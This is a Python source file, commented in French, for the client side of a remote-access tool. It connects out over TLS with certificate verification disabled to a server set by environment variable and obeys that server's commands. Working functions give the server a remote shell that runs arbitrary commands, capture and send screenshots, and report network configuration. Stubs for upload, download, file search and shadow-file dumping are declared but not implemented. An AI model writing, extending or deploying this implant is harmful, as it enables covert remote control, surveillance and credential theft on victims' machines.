import socket
import ssl
import subprocess
import os
from dotenv import load_dotenv
from PIL import ImageGrab

SERVER_PORT = 8888

# Fonction permettant d'envoyer la liste des commandes disponibles
def menu_help(ssl_socket):
    print('help')

# Fonction permettant de charger un fichier du serveur
def download(ssl_socket):
    print('download')

# Fonction permettant de télécharger un fichier du serveur
def upload(ssl_socket):
    print('upload')

# Fonction permettant d'accepter un shell depuis le serveur
def shell(ssl_socket):
    while True:
        commande_shell_received = ssl_socket.recv(4096).decode()
        if commande_shell_received.lower() == 'quit':
            break
        commande_shell = subprocess.run(commande_shell_received, shell=True, capture_output=True, text=True)
        commande_shell_to_send = commande_shell.stdout + commande_shell.stderr
        ssl_socket.send(commande_shell_to_send.encode())

# Fonction permettant d'envoyer la configuration réseau au serveur
def ipconfig(ssl_socket):
    os_type = os.name # Récupération du nom de l'OS de la machine
    if os_type == "posix": # Test si la machine est une Linux
        conf = subprocess.run(['ifconfig'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True) # Exécution de la commande "ifconfig" et stockage de ses sorties
        conf_to_send = conf.stdout + conf.stderr # Concaténation des sorties de la commande "ifconfig"
    elif os_type == "nt": # Test si la machine est une Windows
        conf = subprocess.run(['ipconfig'], stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True) # Exécution de la commande "ipconfig" et stockage de ses sorties
        conf_to_send = conf.stdout + conf.stderr # Concaténation des sorties de la commande "ipconfig"
    else:
        conf_to_send = "OS non reconnu" # Gestion d'erreur
    ssl_socket.send(conf_to_send.encode()) # Envoie de la configuration au serveur

# Fonction permettant d'envoyer la capture d'écran au serveur
def screenshot(ssl_socket):
    screenshot = ImageGrab.grab()  # Capture de l'écran
    screenshot.save('screenshot.png')  # Sauvegarder la capture d'écran dans un fichier
    with open('screenshot.png', 'rb') as screenshot_file: # Ouverture de la capture d'écran
        while True:
            screenshot_to_send = screenshot_file.read(4096) # Stoakage des données de la capture d'écran
            if not screenshot_to_send:
                break
            ssl_socket.send(screenshot_to_send) # Envoie de la capture d'écran
    ssl_socket.send(b'END') # Envoie d'un délimiteur final

# Fonction permettant de localiser le fichier demander par le serveur
def search(ssl_socket):
    print('search')

# Fonction permettant d'envoyer le fichier shadow au serveur
def hashdump(ssl_socket):
    print('hashdump')



def main():

    # Récupération des variables
    load_dotenv()
    ip_server = os.getenv('IP_SERVER')

    # Création du contexte SSL pour la connexion au serveur
    context = ssl.create_default_context()
    context.check_hostname = False # Désactivation de la vérification du nom d'hôte du serveur
    context.verify_mode = ssl.CERT_NONE # Désactivation de la vérification du certificat SSL du serveur

    # Création du socket TCP pour la connexion au serveur
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    ssl_socket = context.wrap_socket(client_socket, server_hostname=ip_server) # Enveloppement du socket avec SSL pour sécuriser la communication
    ssl_socket.connect((ip_server, SERVER_PORT)) # Connexion au serveur en utilisant l'adresse IP et le port de connexion

    # Gestion des commandes reçues pas le serveur
    while True:
        command = ssl_socket.recv(1024).decode()
        if command.lower() == 'help':
            menu_help(ssl_socket)
        elif command.lower() == 'download':
            download(ssl_socket)
        elif command.lower() == 'upload':
            upload(ssl_socket)
        elif command.lower() == 'shell':
            shell(ssl_socket)
        elif command.lower() == 'ipconfig':
            ipconfig(ssl_socket)
        elif command.lower() == 'screenshot':
            screenshot(ssl_socket)
        elif command.lower() == 'search':
            search(ssl_socket)
        elif command.lower() == 'hashdump':
            hashdump(ssl_socket)
        elif command.lower() == 'exit':
            break

    ssl_socket.close() # Fermeture du socket

if __name__ == "__main__":
    main()
